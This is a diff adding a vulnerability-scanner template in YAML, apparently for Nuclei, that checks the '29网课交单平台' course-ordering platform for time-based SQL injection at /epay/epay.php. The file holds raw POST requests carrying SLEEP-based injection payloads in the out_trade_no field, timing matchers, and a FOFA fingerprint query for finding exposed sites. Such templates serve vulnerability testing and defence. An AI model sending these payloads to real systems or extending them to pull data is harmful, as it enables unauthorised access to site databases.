@@ -1,0 +1,25 @@
+http:
+    - matchers:
+        - condition: and
+          dsl:
+            - duration_1>=4 && duration_1<=5
+            - duration_2>=8 && duration_2<=9
+          type: dsl
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - "POST /epay/epay.php HTTP/1.1 \nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nContent-Type: application/x-www-form-urlencoded\n\nout_trade_no=' AND (SELECT 8078 FROM (SELECT(SLEEP(4)))eEcA) AND 'aEmC'='aEmC\n"
+        - "POST /epay/epay.php HTTP/1.1 \nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nContent-Type: application/x-www-form-urlencoded\n\nout_trade_no=' AND (SELECT 8078 FROM (SELECT(SLEEP(8)))eEcA) AND 'aEmC'='aEmC\n"
+id: 29wangke-epay-sql-injection
+info:
+    author: Superhero
+    description: |-
+        fofa: body="Ashx/Usermanager.ashx"
+        29网课交单平台 /epay/epay.php接口处存在SQL注入漏洞，未经授权攻击者可通过该漏洞获取数据库敏感信息，进一步利用可获取服务器权限，导致网站处于极度不安全状态。
+    name: 29网课交单平台 epay.php SQL注入漏洞
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247484245&idx=1&sn=90d5ff30be0453c08ee7161c92a50267&chksm=c267b666f5103f706f760459162b88cd12e1dcd2d168f12eec782f5b8fd9689914feb6282090&token=1619136955&lang=zh_CN#rd
+    severity: high
+    tags: []
